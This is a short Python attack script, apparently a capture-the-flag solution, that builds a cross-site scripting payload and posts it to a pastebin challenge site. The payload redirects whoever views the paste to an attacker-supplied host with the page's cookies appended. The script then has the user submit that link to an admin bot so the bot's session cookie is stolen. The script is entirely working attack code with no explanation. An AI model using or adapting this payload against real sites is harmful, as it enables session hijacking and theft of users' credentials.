import requests
import sys

lhost = sys.argv[1]

payload = f'<script>window.location.href = "{lhost}/"+document.cookie</script>'
print(payload)
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
print("[+] Sending xss-payload")
xss = requests.post("https://pastebin-1.mc.ax/create", data={"content": payload})

print("[+] Fetching pastebin-url")
print(xss.url)
print("[+] Enter that url in https://admin-bot.mc.ax/pastebin-1")
